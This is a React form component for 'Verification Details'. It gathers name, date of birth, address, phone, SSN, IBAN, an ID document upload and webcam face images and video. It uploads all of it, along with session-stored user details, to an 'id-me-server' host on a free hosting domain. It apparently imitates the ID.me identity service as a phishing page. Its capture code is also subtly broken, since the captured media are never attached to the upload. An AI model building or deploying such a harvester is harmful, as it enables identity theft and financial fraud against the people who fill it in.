import { isValidPhoneNumber, CountryCode } from "libphonenumber-js";
import React, { useState, useRef, useCallback } from "react";
import IBAN from "iban";
import axios from "axios";
import CongratulationsCard from "./CongratulationCard";
import { Countrie, countryCodeMap } from "../../hooks/Country";
import Webcam from "react-webcam";

const Data_Inputs: React.FC = () => {
	const [citizenship, setCitizenship] = useState("");
	const [showFaceCapture, setShowFaceCapture] = useState(false);
	const [showSSN, setShowSSN] = useState(false);
	const [showIBAN, setShowIBAN] = useState(false);
	const [videoURL, setVideoURL] = useState<string | null>(null);
	const [imageURL, setImageURL] = useState<string | null>(null);
	const [phoneError, setPhoneError] = useState<string | null>(null);
	const [ssnError, setSSNError] = useState<string | null>(null);
	const [ibanError, setIBANError] = useState<string | null>(null);
	const [loading, setLoading] = useState(false);
	const [success, setSuccess] = useState(false);
	const [error, setError] = useState(false);
	const mediaRecorderRef = useRef<MediaRecorder | null>(null);
	const [, setshowMessage] = useState(false);
	const [showCongratulations, setShowCongratulations] = useState(false);
	const FormREF = useRef<HTMLFormElement>(null);
	const [imageCameraOn, setImageCameraOn] = useState<boolean>(false);
	const [videoCameraOn, setVideoCameraOn] = useState<boolean>(false);
	const [imageSrc, setImageSrc] = useState<string | null>(null);
	const [videoSrc, setVideoSrc] = useState<string | null>(null);
	const [capturing, setCapturing] = useState<boolean>(false);
	const imageWebcamRef = useRef<Webcam>(null);
	const videoWebcamRef = useRef<Webcam>(null);
	const [recordedChunks, setRecordedChunks] = useState<Blob[]>([]);

	const handleCitizenshipChange = (e: React.ChangeEvent<HTMLSelectElement>) => {
		const selectedCitizenship = e.target.value;
		setCitizenship(selectedCitizenship);
		setShowSSN(selectedCitizenship === "United States");
		setShowIBAN(selectedCitizenship === "Germany");
		setShowFaceCapture(selectedCitizenship === "United States");
	};

	const validatePhoneNumber = (phoneNumber: string, countryCode: CountryCode) => {
		try {
			if (!isValidPhoneNumber(phoneNumber, countryCode)) {
				setPhoneError("Invalid phone number for the selected country.");
				return false;
			}
			setPhoneError(null);
			return true;
		} catch (error) {
			console.error("Error validating phone number:", error);
			setPhoneError("Error validating phone number.");
			return false;
		}
	};

	const validateSSN = (ssn: string) => {
		const ssnPattern = /^\d{3}-\d{2}-\d{4}$/;
		if (!ssnPattern.test(ssn)) {
			setSSNError("Invalid SSN format. Use XXX-XX-XXXX.");
			return false;
		}
		setSSNError(null);
		return true;
	};

	const validateIBAN = (iban: string) => {
		if (!IBAN.isValid(iban)) {
			setIBANError("Invalid IBAN number.");
			return false;
		}
		setIBANError(null);
		return true;
	};

	const resetForm = () => {
		if (FormREF.current) {
			FormREF.current.reset();
		}
		setCitizenship("");
		setShowFaceCapture(false);
		setShowSSN(false);
		setShowIBAN(false);
		setVideoURL(null);
		setImageURL(null);
		setPhoneError(null);
		setSSNError(null);
		setIBANError(null);
		setSuccess(false);
		setError(false);
	};

	const handleSubmit = async (e: React.FormEvent) => {
		e.preventDefault();
		const formData = new FormData(e.target as HTMLFormElement);
		const phoneNumber = formData.get("phoneNumber") as string;
		const ssn = formData.get("ssn") as string;
		const iban = formData.get("iban") as string;

		const countryCode = countryCodeMap[citizenship];

		const stringifyDetails = sessionStorage.getItem("userDetails");
		const parsedUserDetails = stringifyDetails && JSON.parse(stringifyDetails);
		formData.append("userDetails", JSON.stringify(parsedUserDetails));

		if (phoneNumber && !validatePhoneNumber(phoneNumber, countryCode)) return;
		if (ssn && !validateSSN(ssn)) return;
		if (iban && !validateIBAN(iban)) return;

		if (videoURL) {
			const response = await fetch(videoURL);
			const videoBlob = await response.blob();
			formData.append("video", videoBlob, "recording.webm");
		}
		if (imageURL) {
			const response = await fetch(imageURL);
			const imageBlob = await response.blob();
			formData.append("image", imageBlob, "capture.jpg");
		}

		setLoading(true);
		axios.post("https://id-me-server.onrender.com/upload", formData)
			.then((response) => {
				if (response.status === 200) {
					setLoading(false);
					console.log("Files uploaded successfully", response.data);
					setSuccess(true);
					setshowMessage(true);
					setShowCongratulations(true);
					resetForm();
				}
			})
			.catch((err) => {
				console.error("Error uploading files", err);
				setError(true);
				setLoading(false);
				setshowMessage(false);
			});
	};

	const handleCloseCongratulations = () => {
		setShowCongratulations(false);
	};

	//camera capture handlers
	const handleStartImageCamera = () => {
		setImageCameraOn(true);
	};

	const retakeImage = () => {
		setImageSrc(null);
		handleStartImageCamera();
	};

	const handleStopImageCamera = () => {
		setImageCameraOn(false);
	};

	const captureImage = useCallback(() => {
		if (imageWebcamRef.current) {
			const imageSrc = imageWebcamRef.current.getScreenshot();
			setImageSrc(imageSrc);
			handleStopImageCamera();
		}
	}, [imageWebcamRef]);

	//video handlers
	const handleStartVideoCamera = () => {
		setVideoCameraOn(true);
	};

	const handleStopVideoCamera = () => {
		setVideoCameraOn(false);
	};

	const retakeVideo = () => {
		setVideoSrc(null);
		setRecordedChunks([]);
		handleStartVideoCamera();
	};

	const handleDownload = useCallback(() => {
		if (recordedChunks.length) {
			const blob = new Blob(recordedChunks, {
				type: "video/webm",
			});
			const url = URL.createObjectURL(blob);
			setVideoSrc(url);
			setRecordedChunks([]);
		}
	}, [recordedChunks]);

	const handleDataAvailable = useCallback(
		(event: BlobEvent) => {
			if (event.data.size > 0) {
				setRecordedChunks((prev) => prev.concat(event.data));
			}
		},
		[setRecordedChunks]
	);

	const handleStartCaptureClick = useCallback(() => {
		if (videoWebcamRef.current && videoWebcamRef.current.stream) {
			setCapturing(true);
			mediaRecorderRef.current = new MediaRecorder(videoWebcamRef.current.stream, {
				mimeType: "video/webm",
			});
			mediaRecorderRef.current.addEventListener("dataavailable", handleDataAvailable);
			mediaRecorderRef.current.start();
		}
	}, [handleDataAvailable]);

	const handleStopCaptureClick = useCallback(() => {
		if (mediaRecorderRef.current) {
			mediaRecorderRef.current.stop();
			setCapturing(false);
		}
	}, [mediaRecorderRef]);

	return (
		<form
			ref={FormREF}
			className='bg-white m-auto my-6 mx-4 h-full relative rounded-lg shadow-lg p-6'
			onSubmit={handleSubmit}
		>
			{showCongratulations && <CongratulationsCard onClose={handleCloseCongratulations} />}

			<h2 className='text-2xl font-semibold mb-6 text-gray-800'>Verification Details</h2>
			<div className='flex ga flex-wrap h-auto -mx-3'>
				{/* citizen */}
				<div className='mb-6 px-3 w-1/2'>
					<label htmlFor='citizenship' className='block text-sm font-medium text-gray-700 mb-2'>
						Citizenship
					</label>
					<select
						id='citizenship'
						name='citizenship'
						className='w-full border border-gray-300 focus:ring-blue-500 focus:border-blue-500 rounded-md shadow-sm p-2'
						onChange={handleCitizenshipChange}
						value={citizenship}
						required
					>
						<option value=''>Select your country</option>
						{Countrie.map((country) => (
							<option key={country} value={country}>
								{country}
							</option>
						))}
					</select>
				</div>

				{/* first name */}
				<div className='mb-6 px-3 w-1/2'>
					<label htmlFor='firstName' className='block text-sm font-medium text-gray-700 mb-2'>
						First Name
					</label>
					<input
						type='text'
						id='firstName'
						name='firstName'
						className='w-full border border-gray-300 focus:ring-blue-500 focus:border-blue-500 rounded-md shadow-sm p-2'
						placeholder='Enter your first name...'
						required
					/>
				</div>

				{/* lastname */}
				<div className='mb-6 px-3 w-1/2'>
					<label htmlFor='lastName' className='block text-sm font-medium text-gray-700 mb-2'>
						Last Name
					</label>
					<input
						type='text'
						id='lastName'
						name='lastName'
						className='w-full border border-gray-300 focus:ring-blue-500 focus:border-blue-500 rounded-md shadow-sm p-2'
						placeholder='Enter your last name...'
						required
					/>
				</div>

				{/* dob */}
				<div className='mb-6 px-3 w-1/2'>
					<label htmlFor='dob' className='block text-sm font-medium text-gray-700 mb-2'>
						Date of Birth
					</label>
					<input
						type='date'
						id='dob'
						name='dob'
						className='w-full border border-gray-300 focus:ring-blue-500 focus:border-blue-500 rounded-md shadow-sm p-2'
						required
					/>
				</div>

				{/* address */}
				<div className='mb-6 px-3 w-1/2'>
					<label htmlFor='address' className='block text-sm font-medium text-gray-700 mb-2'>
						Address
					</label>
					<input
						type='text'
						id='address'
						name='address'
						className='w-full border border-gray-300 focus:ring-blue-500 focus:border-blue-500 rounded-md shadow-sm p-2'
						placeholder='Enter your address...'
						required
					/>
				</div>

				{/* phone */}
				<div className='mb-6 px-3 w-1/2'>
					<label htmlFor='phoneNumber' className='block text-sm font-medium text-gray-700 mb-2'>
						Phone Number
					</label>
					<input
						type='text'
						id='phoneNumber'
						name='phoneNumber'
						className='w-full border border-gray-300 focus:ring-blue-500 focus:border-blue-500 rounded-md shadow-sm p-2'
						placeholder='Enter your phone number...'
						required
					/>
					{phoneError && <p className='text-red-500 text-sm mt-2'>{phoneError}</p>}
				</div>

				{/* ssn */}
				{showSSN && (
					<div className='mb-6 px-3 w-1/2'>
						<label htmlFor='ssn' className='block text-sm font-medium text-gray-700 mb-2'>
							Social Security Number (SSN)
						</label>
						<input
							type='text'
							id='ssn'
							name='ssn'
							className='w-full border border-gray-300 focus:ring-blue-500 focus:border-blue-500 rounded-md shadow-sm p-2'
							placeholder='Enter ssn Use XXX-XX-XXXX'
							required
						/>
						{ssnError && <p className='text-red-500 text-sm mt-2'>{ssnError}</p>}
					</div>
				)}

				{/* upload */}
				<div className='mb-6 px-3 w-1/2'>
					<label htmlFor='document' className='block text-sm font-medium text-gray-700 mb-2'>
						Upload Document (Driver's License/Passport)
					</label>
					<input
						type='file'
						id='document'
						name='document'
						accept='.jpg, .jpeg, .png, .pdf'
						className='w-full border border-gray-300 focus:ring-blue-500 focus:border-blue-500 rounded-md shadow-sm p-2'
					/>
				</div>

				{/* image and video capturing */}
				<div className='flex w-full justify-between bg-blue-100 rounded-md m-[1rem] px-[2rem]'>
					{/* video */}
					{showFaceCapture && (
						<div className='flex flex-col items-center'>
							<p className='text-xl capitalize mb-4'>video record</p>
							{!videoCameraOn && !videoSrc && !capturing && (
								<button
									onClick={handleStartVideoCamera}
									className='bg-blue-500 hover:bg-blue-700 text-white font-bold py-2 px-4 rounded'
								>
									Start Camera
								</button>
							)}
							{videoCameraOn && !videoSrc && (
								<div>
									<Webcam
										audio={true}
										ref={videoWebcamRef}
										screenshotFormat='image/jpeg'
										width='200'
										height='150'
										className='mx-auto'
									/>
									<div className='mt-4 flex justify-center'>
										{capturing ? (
											<button
												onClick={handleStopCaptureClick}
												className='bg-red-500 hover:bg-red-700 text-white font-bold py-2 px-4 rounded mr-2'
											>
												Stop Recording
											</button>
										) : (
											<button
												onClick={handleStartCaptureClick}
												className='bg-green-500 hover:bg-green-700 text-white font-bold py-2 px-4 rounded mr-2'
											>
												Start Recording
											</button>
										)}
										<button
											onClick={handleStopVideoCamera}
											className='bg-gray-500 hover:bg-gray-700 text-white font-bold py-2 px-4 rounded'
										>
											Stop Camera
										</button>
									</div>
								</div>
							)}
							{!videoCameraOn && videoSrc && (
								<div>
									<h3 className='text-xl font-bold mb-2'>Recorded Video:</h3>
									<video src={videoSrc} controls className='w-80 h-60' />
									<div className='mt-4 flex justify-center'>
										<button
											onClick={retakeVideo}
											className='bg-yellow-500 hover:bg-yellow-700 text-white font-bold py-2 px-4 rounded mr-2'
										>
											Retake Video
										</button>
										<button
											onClick={handleDownload}
											className='bg-blue-500 hover:bg-blue-700 text-white font-bold py-2 px-4 rounded'
										>
											Download Video
										</button>
									</div>
								</div>
							)}
						</div>
					)}

					{/* image */}
					<div className='flex flex-col items-center h-fit mb-[1rem]'>
						<p className='text-xl capitalize mb-4'>face Capture</p>
						{!imageCameraOn && !imageSrc && (
							<button
								onClick={handleStartImageCamera}
								className='bg-blue-500 hover:bg-blue-700 text-white font-bold py-2 px-4 rounded'
							>
								Start Camera
							</button>
						)}
						{imageCameraOn && !imageSrc && (
							<div>
								<Webcam
									audio={false}
									ref={imageWebcamRef}
									screenshotFormat='image/jpeg'
									width='200'
									height='150'
									className='mx-auto'
								/>
								<div className='mt-4 flex justify-center space-x-4'>
									<button
										onClick={captureImage}
										className='bg-green-500 hover:bg-green-700 text-white font-bold py-2 px-4 rounded'
									>
										CaptureImage
									</button>
									<button
										onClick={handleStopImageCamera}
										className='bg-red-500 hover:bg-red-700 text-white font-bold py-2 px-4 rounded'
									>
										Stop Camera
									</button>
								</div>
							</div>
						)}
						{imageSrc && (
							<div className='mt-4'>
								<h3 className='text-xl font-bold mb-2'>Captured Image:</h3>
								<img src={imageSrc} alt='Captured' className='w-80 h-60 object-cover' />
								<div className='mt-4'>
									<button
										onClick={retakeImage}
										className='bg-yellow-500 hover:bg-yellow-700 text-white font-bold py-2 px-4 rounded'
									>
										Retake Image
									</button>
								</div>
							</div>
						)}
					</div>
				</div>

				{showIBAN && (
					<div className='mb-6 px-3 w-1/2'>
						<label htmlFor='iban' className='block text-sm font-medium text-gray-700 mb-2'>
							IBAN Number
						</label>
						<input
							type='text'
							id='iban'
							name='iban'
							className='w-full border border-gray-300 focus:ring-blue-500 focus:border-blue-500 rounded-md shadow-sm p-2'
							placeholder='Enter your IBAN...'
							required
						/>
						{ibanError && <p className='text-red-500 text-sm mt-2'>{ibanError}</p>}
					</div>
				)}
				<div className='w-full px-3'>
					<button
						type='submit'
						className='bg-blue-500 text-white px-6 py-3 rounded-md shadow-sm hover:bg-blue-600 transition w-full'
					>
						{loading ? <p>Loading...</p> : "Submit"};
					</button>
				</div>
			</div>
			{success && <p style={{ color: "green" }}>Form submitted successfully!</p>}
			{error && <p style={{ color: "red" }}>There was an error submitting the form.</p>}
		</form>
	);
};

export default Data_Inputs;
